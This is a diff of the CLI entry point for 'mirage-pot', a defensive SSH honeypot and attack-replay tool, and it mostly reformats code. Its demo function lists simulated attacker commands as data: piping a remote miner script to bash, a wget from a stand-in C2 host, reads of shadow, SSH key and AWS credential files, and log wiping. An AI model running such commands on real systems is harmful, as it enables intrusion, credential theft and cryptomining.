@@ -2,16 +2,16 @@
 
 import argparse
 import asyncio
-import os
-import random
 import sys
 import time
+
 from rich.live import Live
 
+from .detector import classify_command
 from .hud import AttackHUD, replay_session
 from .recorder import SessionEvent
 from .server import start_server
-from .detector import classify_command
+
 
 def run_demo():
     """Runs a live simulated attack HUD showcase with realistic bot sequences."""
@@ -23,9 +23,19 @@ def run_demo():
         ("194.26.29.112", "ubuntu", "curl -s http://194.26.29.112/xmrig.sh | bash", "#!/bin/sh..."),
         ("185.220.101.5", "root", "cat /root/.env", "APP_ENV=production\nDATABASE_URL=..."),
         ("91.240.118.23", "admin", "cat /etc/shadow", "root:$6$vQ9yU2K1..."),
-        ("185.220.101.5", "root", "cat /root/.ssh/id_rsa", "-----BEGIN OPENSSH PRIVATE KEY-----..."),
+        (
+            "185.220.101.5",
+            "root",
+            "cat /root/.ssh/id_rsa",
+            "-----BEGIN OPENSSH PRIVATE KEY-----...",
+        ),
         ("194.26.29.112", "ubuntu", "ps aux", "root 1 0.0 /sbin/init..."),
-        ("45.154.255.89", "root", "wget http://c2.evil-corp.net/bot.elf", "bot.elf saved [2048/2048]"),
+        (
+            "45.154.255.89",
+            "root",
+            "wget http://c2.evil-corp.net/bot.elf",
+            "bot.elf saved [2048/2048]",
+        ),
         ("185.220.101.5", "root", "history -c && rm -rf /tmp/*", ""),
         ("91.240.118.23", "admin", "crontab -l", "no crontab for admin"),
         ("45.154.255.89", "root", "cat ~/.aws/credentials", "[default]\naws_access_key_id = ..."),
@@ -55,14 +65,19 @@ def run_demo():
     finally:
         print("\033[?25h", end="")  # show cursor
 
+
 def main():
-    parser = argparse.ArgumentParser(description="mirage-pot: Adaptive Deception Honeypot & Live Attack HUD")
+    parser = argparse.ArgumentParser(
+        description="mirage-pot: Adaptive Deception Honeypot & Live Attack HUD"
+    )
     subparsers = parser.add_subparsers(dest="command", help="Subcommand to run")
 
     # listen
     listen_parser = subparsers.add_parser("listen", help="Start the SSH honeypot listener")
     listen_parser.add_argument("--host", default="0.0.0.0", help="Binding host (default: 0.0.0.0)")
-    listen_parser.add_argument("--port", type=int, default=2222, help="Binding port (default: 2222)")
+    listen_parser.add_argument(
+        "--port", type=int, default=2222, help="Binding port (default: 2222)"
+    )
     listen_parser.add_argument("--log", default="data/sessions.jsonl", help="Log output path")
     listen_parser.add_argument("--key", default="data/host_key", help="Host private key path")
     listen_parser.add_argument("--hud", action="store_true", help="Launch live HUD in foreground")
@@ -70,7 +85,9 @@ def main():
     # replay
     replay_parser = subparsers.add_parser("replay", help="Replay a captured JSONL attacker session")
     replay_parser.add_argument("session_file", help="Path to .jsonl session log")
-    replay_parser.add_argument("--speed", type=float, default=1.0, help="Playback speed multiplier (e.g. 1.0, 4.0)")
+    replay_parser.add_argument(
+        "--speed", type=float, default=1.0, help="Playback speed multiplier (e.g. 1.0, 4.0)"
+    )
 
     # demo
     subparsers.add_parser("demo", help="Run simulated live attack HUD demo")
@@ -112,6 +129,7 @@ def main():
             print("\n[-] Shutting down honeypot listener...")
     else:
         parser.print_help()
+
 
 if __name__ == "__main__":
     main()
